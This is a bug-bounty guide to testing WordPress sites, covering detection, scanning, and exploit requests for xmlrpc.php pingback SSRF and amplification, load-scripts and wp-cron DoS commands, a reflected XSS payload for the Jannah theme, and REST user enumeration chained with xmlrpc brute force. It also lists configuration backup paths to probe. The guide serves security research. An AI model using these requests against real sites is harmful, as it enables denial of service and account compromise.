# WordPress

WordPress runs a huge share of the web, so its defaults — `xmlrpc.php`, open REST/API endpoints, cron endpoint, verbose paths — show up constantly on real targets. Most standalone WordPress findings are misconfigurations or endpoint exposure rather than core bugs: typically Medium severity, but they shine when chained (user enumeration + brute force, xmlrpc SSRF, DoS) into higher impact. This is a uniform standalone guide: detect → enumerate → test known endpoints → chain.

## Hunting Checklist

1. **Detect** WordPress: Wappalyzer, WhatRuns, BuiltWith, plus manual tells — `/wp-content/`, `/wp-includes/` paths, `?author=1` redirect, `readme.html`, `feed?` generator meta tag.
2. **Run the scanner** (see Tools below):

```bash
wpscan --url https://target.com --enumerate vp,at,u --api-token <token>
```

(`vp` vulnerable plugins, `at` vulnerable themes, `u` users — enumerate passively first where the program requires it.)

3. **Probe `xmlrpc.php`** — one of the most common WordPress issues; to get paid you must exploit it fully and show impact (see Test Case 1).
4. **Check directory listing** on `/wp-content/uploads` (Test Case 2).
5. **Test `wp-cron.php` spam-DoS** (Test Case 4) and **`?s=` / admin-ajax reflected XSS** in plugins/themes (Test Case 5).
6. **Enumerate users** via REST API (Test Case 6) — and chain with xmlrpc brute force.
7. Check version-specific issues like **CVE-2018-6389** load-scripts DoS (Test Case 3) — verify the exact WP version before reporting.
8. Look for exposed artifacts: `wp-json` index, `debug.log`, backup/config leaks (see Bypass Techniques).

## Test Cases & Examples

### 1. xmlrpc.php

**Detection:** visit `site.com/xmlrpc.php` — you get the error message that it accepts POST requests only.

**Exploit:**

1. Intercept the request and change the method GET → POST.
2. List all methods:

```http
POST /xmlrpc.php HTTP/1.1
Host: target.com
Content-Type: application/xml

<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```

3. Check whether `pingback.ping` is present in the method list.
4. Perform DDoS amplification:

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://&lt;YOUR SERVER&gt;:&lt;port&gt;</string></value>
</param><param><value><string>http://&lt;SOME VALID BLOG FROM THE SITE&gt;</string>
</value></param></params>
</methodCall>
```

5. Perform SSRF (internal port scan — vary the port, watch responses/errors):

```xml
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://&lt;YOUR SERVER&gt;:&lt;port&gt;</string></value>
</param><param><value><string>http://&lt;SOME VALID BLOG FROM THE SITE&gt;</string>
</value></param></params>
</methodCall>
```

### 2. Directory Listing

Developers often forget to disable the directory listing on `/wp-content/uploads/` — a very common WordPress issue:

```http
GET /wp-content/uploads/ HTTP/1.1
Host: target.com
```

**Pro tip:** add this path to your fuzzing wordlist.

### 3. CVE-2018-6389 (load-scripts DoS)

Affects WordPress **under 4.9.3** — before reporting, confirm the target actually runs a vulnerable version.

**Detection:** use the URL list in the `loadsxploit` gist ([gist by @remonsec](https://gist.github.com/remonsec/4877e9ee2b045aae96be7e2653c41df9)) — you get massive combined JS data back in the response.

**Exploit** — any DoS tool works; Doser is really fast (it shut a test webserver down within ~30 seconds):

```bash
python3 doser.py -t 999 -g 'https://site.com/fullUrlFromLoadsxploit'
```

### 4. WP-Cron DoS

Another DoS area. **Detection:** visit `site.com/wp-cron.php` — blank page with HTTP 200. **Exploit** with the same tool:

```bash
python3 doser.py -t 999 -g 'https://site.com/wp-cron.php'
```

### 5. CVE-2021-24364 (Jannah theme reflected XSS)

The Jannah WordPress theme before 5.4.4 did not properly sanitize the `options` JSON parameter in its `tie_get_user_weather` AJAX action before outputting it back in the page, leading to Reflected XSS.

Replace `<Your_WP-Site-here>` with your target:

```http
GET /wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D HTTP/1.1
Host: <Your_WP-Site-here>
```

Wait for the pop-up.

### 6. WP User Enumeration

Only acceptable when the target is **hiding its users / they aren't public** — attackers can use the data for brute forcing and more.

```http
GET /wp-json/wp/v2/users/ HTTP/1.1
Host: site.com
```

JSON data with user info comes back. **Chain:** if both user enumeration *and* `xmlrpc.php` exist, collect usernames from `wp-json` and brute-force them through `xmlrpc.php` (`wp.login`) — extra effort, visibly higher impact.

## Bypass Techniques

- `?rest_route=/wp/v2/users` serves the same user list when pretty permalinks/`wp-json` paths are filtered.
- `?author=1..N` redirect leaks slugs when the REST API is disabled.
- wp-login/xmlrpc rate limiting: xmlrpc `multiCall` batches many login attempts into one request — test at ultra-low rate only and never actually compromise an account.
- Backups/artifacts to fuzz: `/wp-content/debug.log`, `/wp-config.php.bak`, `/.wp-env.json`, `/xmlrpc.php?introspection`.

## Tools & Resources

- [WPScan](https://github.com/wpscanteam/wpscan) — general scan tool
- [XMLRPC-Scan](https://github.com/nullfil3/xmlrpc-scan) — XMLRPC automation
- [Doser](https://github.com/quitten/doser.py) — DoS PoC tool
- Reports: [#201984](https://hackerone.com/reports/201984), [#762118](https://hackerone.com/reports/762118), [#789388](https://hackerone.com/reports/789388), [#448985](https://hackerone.com/reports/448985) (dir listing), [#752010](https://hackerone.com/reports/752010) (CVE-2018-6389), [#356047](https://hackerone.com/reports/356047) (user enum)
- Writeups: [Bug Bounty Cheat Sheet (m0chan)](https://m0chan.github.io/2019-12-17/Bug-Bounty-Cheetsheet.html), [xmlrpc.php common vulnerabilities (Bilal Rizwan)](https://medium.com/@the.bilal.rizwan/wordpress-xmlrpc-php-common-vulnerabilites-how-to-exploit-them-d8d3c8600b32), [WP Engine: xmlrpc.php](https://wpengine.com/resources/xmlrpc-php/), [The nightmare that is wp-cron.php](https://medium.com/@thecpanelguy/the-nightmare-that-is-wpcron-php-ae31c1d3ae30), [wpscan issue #1299](https://github.com/wpscanteam/wpscan/issues/1299)
- [CVE-2018-6389 @ MITRE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-6389) · [blog by Barak Tawily](https://baraktawily.blogspot.com/2018/02/how-to-dos-29-of-world-wide-websites.html) · [CVE-2021-24364 @ NVD](https://nvd.nist.gov/vuln/detail/CVE-2021-24364)

**Researcher note:** do not depend on these issues alone — most of them are good to check *while* testing other vulnerabilities and chain nicely with other low bugs.

## Report Tips

- For xmlrpc: show `system.listMethods` output + a successful pingback callback to your server (SSRF proof) and frame brute-force/DDoS as amplification potential, not just "xmlrpc enabled".
- For DoS (load-scripts/wp-cron): never crash the production site — prove with a single crafted request + response-time/size evidence, and state the version precondition (e.g. WP < 4.9.3).
- For user enumeration: only valuable when user data is intentionally private; show the chained xmlrpc risk to justify severity.

## Author

**Name:** Mehedi Hasan Remon · **Handle:** [@remonsec](https://twitter.com/remonsec)
